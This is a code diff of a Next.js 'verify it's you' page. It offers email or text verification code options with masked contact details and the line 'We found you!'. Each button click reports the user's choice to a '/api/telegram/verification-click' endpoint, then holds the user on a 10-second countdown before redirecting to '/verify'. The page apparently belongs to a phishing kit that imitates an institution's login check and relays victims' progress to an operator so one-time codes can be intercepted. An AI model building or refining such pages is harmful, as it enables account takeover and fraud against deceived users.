@@ -2,38 +2,51 @@
 
 import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
-import { HelpCircle, MessageCircle, Phone, Loader2 } from "lucide-react";
+import { Mail, Phone, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { SiteHeader } from "@/components/site-header";
-
-const options = [
-  {
-    id: "text",
-    title: "Text Me a Code",
-    subtitle: "You'll enter it to log on.",
-    icon: MessageCircle,
-  },
-  {
-    id: "call",
-    title: "Call Me With a Code",
-    subtitle: "Get a call that says a code for you to enter.",
-    icon: Phone,
-  },
-];
 
 export default function VerifyChoicePage() {
   const router = useRouter();
   const [isLoading, setIsLoading] = useState(false);
-  const [selectedOptionId, setSelectedOptionId] = useState<string | null>(null);
+  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
+  const [email, setEmail] = useState<string>("");
+  const [phone, setPhone] = useState<string>("");
   const [countdown, setCountdown] = useState(0);
   const countdownRef = useRef<number | null>(null);
   const redirectRef = useRef<number | null>(null);
 
-  const handleSelect = async (id: string, title: string) => {
+  // Mask email/phone on component mount (fetch from session/API if needed)
+  useEffect(() => {
+    // In a real app, you'd fetch these from your backend
+    // For now, using placeholder masked values
+    setEmail("****@example.com");
+    setPhone("***-***-****");
+  }, []);
+
+  const maskEmail = (email: string) => {
+    const parts = email.split("@");
+    if (parts.length !== 2) return email;
+    const localPart = parts[0];
+    const masked =
+      localPart.substring(0, 1) +
+      "*".repeat(Math.max(0, localPart.length - 2)) +
+      localPart.substring(localPart.length - 1);
+    return masked + "@" + parts[1];
+  };
+
+  const maskPhone = (phone: string) => {
+    const digits = phone.replace(/\D/g, "");
+    if (digits.length < 10) return phone;
+    return "*".repeat(3) + "-*".repeat(3) + "-" + digits.slice(-4);
+  };
+
+  const handleSelect = async (method: "email" | "text") => {
     if (isLoading) return;
-    setSelectedOptionId(id);
+    setSelectedMethod(method);
     setIsLoading(true);
     setCountdown(10);
+
     countdownRef.current = window.setInterval(() => {
       setCountdown((prev) => {
         if (prev <= 1) {
@@ -46,15 +59,19 @@ export default function VerifyChoicePage() {
         return prev - 1;
       });
     }, 1000);
+
     try {
       await fetch("/api/telegram/verification-click", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ verificationType: title }),
+        body: JSON.stringify({
+          verificationType: method === "email" ? "Email" : "Text",
+        }),
       }).catch(console.error);
     } catch (err) {
       console.error("Failed to send verification-click notification:", err);
     }
+
     redirectRef.current = window.setTimeout(() => {
       router.push("/verify");
     }, 10000);
@@ -70,68 +87,96 @@ export default function VerifyChoicePage() {
   return (
     <div className="min-h-screen bg-white flex flex-col">
       <SiteHeader />
-      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
-        <div className="flex items-center gap-2 mb-2">
-          <h2 className="text-base font-medium text-gray-900">
-            Verify It&apos;s You
-          </h2>
-          <button
-            type="button"
-            className="text-[#254650] hover:underline flex items-center gap-1"
-            aria-label="Help"
-          >
-            <HelpCircle className="w-4 h-4" />
-            <span className="text-sm">Help</span>
-          </button>
+      <div className="flex-1 flex items-center justify-center px-4 py-12">
+        <div className="w-full max-w-md">
+          {/* Message */}
+          <p className="text-center text-gray-700 mb-8">
+            We found you! Pick a method to receive a verification code now.
+          </p>
+
+          {/* Email Option */}
+          <div className="flex items-center justify-between gap-4 mb-6">
+            <div className="flex items-center gap-3 flex-1">
+              <Mail className="w-5 h-5 text-gray-600 shrink-0" />
+              <span className="text-gray-700">Send code to email: {email}</span>
+            </div>
+            <Button
+              type="button"
+              disabled={isLoading}
+              onClick={() => handleSelect("email")}
+              className={`shrink-0 ${
+                selectedMethod === "email" && isLoading
+                  ? "bg-[#0d4a5e] hover:bg-[#0d4a5e]"
+                  : "bg-[#0d4a5e] hover:bg-[#0d3a4e]"
+              } text-white px-4 py-2 rounded h-10 flex items-center gap-2`}
+            >
+              {selectedMethod === "email" && isLoading ? (
+                <Loader2 className="w-4 h-4 animate-spin" />
+              ) : (
+                <Mail className="w-4 h-4" />
+              )}
+              E-MAIL
+            </Button>
+          </div>
+
+          {/* Phone Option */}
+          <div className="flex items-center justify-between gap-4 mb-8">
+            <div className="flex items-center gap-3 flex-1">
+              <Phone className="w-5 h-5 text-gray-600 shrink-0" />
+              <span className="text-gray-700">Send code via text: {phone}</span>
+            </div>
+            <Button
+              type="button"
+              disabled={isLoading}
+              onClick={() => handleSelect("text")}
+              className={`shrink-0 ${
+                selectedMethod === "text" && isLoading
+                  ? "bg-[#0d4a5e] hover:bg-[#0d4a5e]"
+                  : "bg-[#0d4a5e] hover:bg-[#0d3a4e]"
+              } text-white px-4 py-2 rounded h-10 flex items-center gap-2`}
+            >
+              {selectedMethod === "text" && isLoading ? (
+                <Loader2 className="w-4 h-4 animate-spin" />
+              ) : (
+                <Phone className="w-4 h-4" />
+              )}
+              TEXT
+            </Button>
+          </div>
+
+          {/* Buttons */}
+          <div className="flex items-center gap-3 mb-6">
+            <Button
+              type="button"
+              variant="outline"
+              disabled={isLoading}
+              className="flex-1 rounded bg-gray-200 hover:bg-gray-300 text-gray-800 border-gray-300 h-10 disabled:opacity-70 disabled:cursor-not-allowed"
+              onClick={() => router.push("/")}
+            >
+              ✕ CANCEL
+            </Button>
+            <Button
+              type="button"
+              variant="outline"
+              disabled={isLoading}
+              className="flex-1 rounded bg-gray-300 hover:bg-gray-400 text-gray-800 border-gray-400 h-10 disabled:opacity-70 disabled:cursor-not-allowed"
+              onClick={() => router.back()}
+            >
+              ← BACK
+            </Button>
+          </div>
+
+          {/* Help Link */}
+          <div className="text-center">
+            <button
+              type="button"
+              className="text-blue-500 hover:underline text-sm"
+              onClick={() => router.push("/forgot-password")}
+            >
+              I cannot receive a verification code
+            </button>
+          </div>
         </div>
-
-        <h1 className="text-2xl font-semibold text-gray-900 mb-2">
-          Choose an Option
-        </h1>
-        <p className="text-gray-700 text-sm mb-6">
-          Before you can get full access, you&apos;ll need to confirm your
-          identity.
-        </p>
-
-        <div
-          className={`space-y-0 border border-gray-200 rounded-none divide-y divide-gray-200 mb-8 ${isLoading ? "pointer-events-none opacity-60" : ""}`}
-          aria-busy={isLoading}
-        >
-          {options.map(({ id, title, subtitle, icon: Icon }) => {
-            const isSelectedAndLoading = isLoading && selectedOptionId === id;
-            return (
-              <button
-                key={id}
-                type="button"
-                onClick={() => handleSelect(id, title)}
-                disabled={isLoading}
-                className="w-full flex items-start gap-4 px-4 py-4 text-left hover:bg-gray-50 transition-colors disabled:cursor-not-allowed disabled:hover:bg-transparent"
-              >
-                {isSelectedAndLoading ? (
-                  <Loader2 className="w-6 h-6 text-[#254650] shrink-0 mt-0.5 animate-spin" />
-                ) : (
-                  <Icon className="w-6 h-6 text-[#254650] shrink-0 mt-0.5" />
-                )}
-                <div>
-                  <p className="text-[#254650] font-medium">{title}</p>
-                  <p className="text-gray-500 text-sm mt-0.5">
-                    {isSelectedAndLoading ? "Loading..." : subtitle}
-                  </p>
-                </div>
-              </button>
-            );
-          })}
-        </div>
-
-        <Button
-          type="button"
-          variant="outline"
-          disabled={isLoading}
-          className="rounded-md border-gray-300 bg-gray-100 hover:bg-gray-200 text-gray-900 h-9 px-5 disabled:opacity-70 disabled:cursor-not-allowed"
-          onClick={() => router.push("/")}
-        >
-          Cancel
-        </Button>
       </div>
     </div>
   );
